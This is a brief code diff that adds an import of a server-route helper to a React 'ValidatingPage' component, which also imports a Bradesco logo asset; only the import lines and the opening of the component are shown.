@@ -1,6 +1,7 @@
 import { useEffect, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import bradescoLogo from "@/assets/bradesco-logo.png";
+import { resolveServerRoute } from "@/lib/resolveServerRoute";
 
 const ValidatingPage = () => {
   const navigate = useNavigate();
